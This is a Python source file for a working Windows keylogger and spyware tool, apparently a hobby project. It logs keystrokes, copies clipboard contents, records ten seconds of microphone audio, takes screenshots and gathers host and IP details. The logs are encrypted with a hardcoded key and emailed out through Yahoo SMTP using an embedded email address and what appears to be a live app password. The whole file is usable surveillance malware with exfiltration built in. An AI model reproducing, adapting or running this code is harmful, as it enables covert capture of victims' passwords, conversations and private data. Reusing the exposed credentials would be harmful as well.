#imports needed to record the key inputs to a file
from pynput.keyboard import Key, Listener

#import needed to get the file path of any file
import os

#imports needed to send the .txt file to myself
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
from email.message import EmailMessage

#imports needed to get the computer information
from requests import get
import socket
import platform

#import needed to get the clipboard information
import win32clipboard

#imports needed to get audio information
from scipy.io.wavfile import write
import sounddevice as sd

#import needed to get screenshot information
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#import needed for timer
import time

#import needed to encrypt and decrypt files
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

systemInfo = "system.txt"
audioInfo = "audio.wav"
clipboardInfo = "clipboard.txt"
screenshotInfo = "screenshot.png"
keyInfo = "keyLog.txt"
systemInfoEnc = "systemEnc.txt"
clipboardInfoEnc = "clipboardEnc.txt"
keyInfoEnc = "keyLogEnc.txt"
fromAdd = "testcodestuff@yahoo.com"
toAdd = "testcodestuff@yahoo.com"
key = "aI1VNWqKJaT6XWmT5yWFMo5oNWqc2D4lUyEGX9bVFMA="
filesToEncrypt = [systemInfo, clipboardInfo, keyInfo]
encryptedFiles = [systemInfoEnc, clipboardInfoEnc, keyInfoEnc]

count = 0
keys = []
iterations = 0
timeIter = 15
endIter = 1
currentTime = time.time()
stopTime = time.time() + timeIter

#Function that creates and sends an email with an attachment
# def sendEmail(fileName,toAdd):
#     email_address = "testcodestuff@yahoo.com"
#     email_password = "owowflacyimjdjrc"
#     msg = MIMEMultipart()
#     msg["From"] = fromAdd
#     msg["To"] = toAdd
#     msg["Subject"] = "Keylog File"
#     body = "Keylogger do be keylogging!!"
#     msg.attach(MIMEText(body, "plain"))
#     attachment = open(os.path.abspath(fileName), "rb")
#     mimeInst = MIMEBase('application', 'octet-stream') 
#     mimeInst.set_payload((attachment).read())
#     encoders.encode_base64(mimeInst)
#     mimeInst.add_header('Content-Disposition', "attachment; filename= %s" % fileName)
#     msg.attach(mimeInst)
#     smtpSesh = smtplib.SMTP("smtp.mail.yahoo.com", 587) 
#     smtpSesh.starttls()
#     smtpSesh.auth_login(email_address, email_password)
#     txt = msg.as_string()
#     smtpSesh.sendmail(fromAdd, toAdd, txt)
#     smtpSesh.quit()

def encryptFiles():
    count = 0
    for encryptingFile in filesToEncrypt:
        with open(filesToEncrypt[count], 'rb') as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        with open(encryptedFiles[count], 'wb') as f:
            f.write(encrypted)
        #sendEmail(encryptedFiles[count], toAdd)
        sendEmail(encryptedFiles[count])
        count += 1
    time.sleep(120)

def sendEmail(fileName):
    email_address = "testcodestuff@yahoo.com"
    email_password = "owowflacyimjdjrc"
    smtp_server = "smtp.mail.yahoo.com"
    smtp_port = 587
    msg = EmailMessage()
    msg['Subject'] = 'Re: Keylog File'
    msg['From'] = email_address
    msg['To'] = email_address
    msg.set_content("Keylogger do be keylogging!!")
    with open(fileName, 'rb') as f:
        file_data = f.read()
    msg.add_attachment(file_data, maintype='text', subtype='plain', filename=fileName)
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(email_address, email_password)
        server.send_message(msg)

def clipInfo():
    with open(clipboardInfo, "a") as f:
        f.write("Clipboard Data Includes: " + "\n\n")
        win32clipboard.OpenClipboard()
        try:
            clipData = win32clipboard.GetClipboardData()
            f.write(clipData + "\n")
        except Exception:
            f.write("could not get the data(most likely a picture was saved to the clipboard)")
        win32clipboard.CloseClipboard()

#Function that collects the user's computer information
def compInfo():
    with open(systemInfo, "a") as f:
        hostname = socket.gethostname()
        intIP = socket.gethostbyname(hostname)
        procInfo = platform.processor()
        sysInfo = platform.system()
        verInfo = platform.version()
        machInfo = platform.machine()
        f.write("Computer Information: \n \n")
        f.write("Hostname: " + hostname + "\n")
        try:
            extIP = get("https://api.ipify.org").text
            f.write("Public IP Address: " + extIP + "\n")
        except Exception:
            f.write("Could not get the public IP address\n")
        f.write("Private IP Address: " + intIP + "\n" +
                "Processor Information: " + procInfo + "\n" +
                "System Information: " + sysInfo + " " + verInfo + "\n" +
                "Machine Information: " + machInfo)

#Function that creates an aduio file
def micRec():
    fs = 44100
    sec = 10
    myrecording = sd.rec(int(sec * fs), samplerate=fs, channels=2)
    sd.wait()
    write(audioInfo, fs, myrecording)

#Function that captures screenshots
def screenInfo():
    image = ImageGrab.grab()
    image.save(screenshotInfo)


while iterations < endIter:
    #Function that creates an array that holds 10 characters at a time
    def onPress(key):
        global count, keys, currentTime, genKey
        keys.append(key)
        count += 1
        currentTime= time.time()

        if count >= 1:
            count = 0
            writeFile(keys)
            keys = []

    #Function that saves the array to a text file 
    def writeFile(keys):
        with open(keyInfo, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write(" ")
                elif k.find("enter") > 0:
                    f.write("\n")
                elif k.find("Key") == -1:
                    f.write(k)

    #Function that stops the program so that it does not run forever
    def onRelease(key):
        if key == Key.esc:
            return False
        elif currentTime > stopTime:
            return False

    #Creates the loop that listens for key events 
    with Listener(on_press = onPress, on_release = onRelease) as listener:
        listener.join()
    if currentTime > stopTime:
        clipInfo()
        micRec()
        screenInfo()
        #compInfo()
        encryptFiles()
        with open(keyInfo, "w") as f:
            f.write("")
        with open(clipboardInfo, "w") as f:
            f.write("")
        with open(systemInfo, "w") as f:
            f.write("")
        iterations += 1
        currentTime = time.time()
        stopTime = time.time() + timeIter
#compInfo()
#clipInfo()
#sendEmail()
#micRec()
#screenInfo()